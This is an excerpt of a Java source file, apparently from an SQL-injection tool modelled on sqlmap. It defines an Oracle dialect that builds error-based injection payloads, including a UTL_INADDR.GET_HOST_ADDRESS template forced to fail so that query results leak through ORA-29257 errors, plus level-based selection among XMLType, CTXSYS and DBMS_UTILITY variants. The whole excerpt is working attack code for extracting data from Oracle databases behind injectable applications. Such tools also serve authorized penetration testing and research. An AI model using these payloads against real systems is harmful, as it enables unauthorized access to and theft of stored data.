...
public class OracleDialect implements DbmsDialect {
    ...
    public List<String> errorFunctions() {
        ...
        // we use fixed tokens and reverse them after extraction.
        ...
        return List.of(
                ...
                // Level 1: Compact UTL_INADDR without markers — for character-limited injection.
                // Error: "ORA-29257: host ~DATA unknown" — data extracted via ORA-29257 pattern.
                // CHR(126) ('~') prefix FORCES the lookup to always fail — even if (%s) returns
                // a resolvable hostname like "localhost". The leading '~' is stripped after
                // extraction.
                errorRandNum + "=UTL_INADDR.GET_HOST_ADDRESS(CHR(126)||(%s))",
    ...
    public List<String> errorFunctionsForLevel(int level) {
        ...
        // sqlmap gating with compact variant:
        // L1: XMLType (markers) + UTL_INADDR (compact) = indices 0,1
        // L2: +UTL_INADDR (markers) = indices 0-2
        // L3: +CTXSYS = indices 0-3
        // L4: +DBMS_UTILITY = all 5
        if (level >= 4) return all;
        if (level >= 3) return all.subList(0, 4);
        if (level >= 2) return all.subList(0, 3);
        return all.subList(0, 2); // Level 1: XMLType + compact UTL_INADDR
    }
